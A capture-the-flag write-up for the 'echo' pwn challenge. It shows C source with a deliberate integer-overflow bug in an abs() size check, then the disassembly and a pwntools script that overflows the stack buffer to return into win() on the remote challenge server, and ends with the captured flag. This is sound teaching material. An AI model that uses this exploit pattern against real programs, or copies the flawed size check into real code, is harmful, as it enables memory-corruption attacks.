# echo : Pwn

A service for reachability check.

Attachment  
[echo.tar.gz](echo.tar.gz)  

Tags : Buffer Overflow, Integer Overflow, Win Function  
Author : ptr-yudai

# Solution

Check the source code.
```c main.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define BUF_SIZE 0x100

/* Call this function! */
void win() {
  char *args[] = {"/bin/cat", "/flag.txt", NULL};
  execve(args[0], args, NULL);
  exit(1);
}

int get_size() {
  // Input size
  int size = 0;
  scanf("%d%*c", &size);

  // Validate size
  if ((size = abs(size)) > BUF_SIZE) {
    puts("[-] Invalid size");
    exit(1);
  }

  return size;
}

void get_data(char *buf, unsigned size) {
  unsigned i;
  char c;

  // Input data until newline
  for (i = 0; i < size; i++) {
    if (fread(&c, 1, 1, stdin) != 1) break;
    if (c == '\n') break;
    buf[i] = c;
  }
  buf[i] = '\0';
}

void echo() {
  int size;
  char buf[BUF_SIZE];

  // Input size
  printf("Size: ");
  size = get_size();

  // Input data
  printf("Data: ");
  get_data(buf, size);

  // Show data
  printf("Received: %s\n", buf);
}

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  echo();
  return 0;
}
```
This code reveals the existence of win().  
In addition, input size is checked with `abs` funciton, which output absolute value.  
However, if `INT_MIN` is entered to `abs` function, the absolute value will exceed `INT_MAX`, resulting in undefined behaviour.
```
$ checksec echo
[*] '/home/colza/echo'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
The apploach is as follows:
* Input the value of `INT_MIN` at `size`.
* Overflow and overwrite the retern address to `win` address.

The return addres is located at `rbp+0x8`. So, offset from input to return address is `0x118`.
```
  401368:       48 8d 85 f0 fe ff ff    lea    rax,[rbp-0x110]
  40136f:       89 d6                   mov    esi,edx
  401371:       48 89 c7                mov    rdi,rax
  401374:       e8 2c ff ff ff          call   4012a5 <get_data>
```

The steps are as follows:
 * input `-2147483648` as size
 * send the payload consist of 0x118-padding and win address

Execution code below:
```python solve.py
from pwn import *

elf = ELF("./echo")

p = remote("34.170.146.252", 48657)

p.sendlineafter(b"Size: ", b"-2147483648")

win_addr = elf.symbols["win"]

payload = b"a" * 0x118 + p64(win_addr)
p.sendlineafter(b"Data: ", payload)

p.interactive()
```
Execute it.
```
$ python3 solve.py
[*] '/home/colza/echo'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 34.170.146.252 on port 48657: Done
[*] Switching to interactive mode
Received: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf6\x11@
Alpaca{s1Gn3d_4Nd_uNs1gn3d_s1zEs_c4n_cAu5e_s3ri0us_buGz}
[*] Got EOF while reading in interactive
$
$
[*] Closed connection to 34.170.146.252 port 48657
[*] Got EOF while sending in interactive
```

Get the flag!

`Alpaca{s1Gn3d_4Nd_uNs1gn3d_s1zEs_c4n_cAu5e_s3ri0us_buGz}`
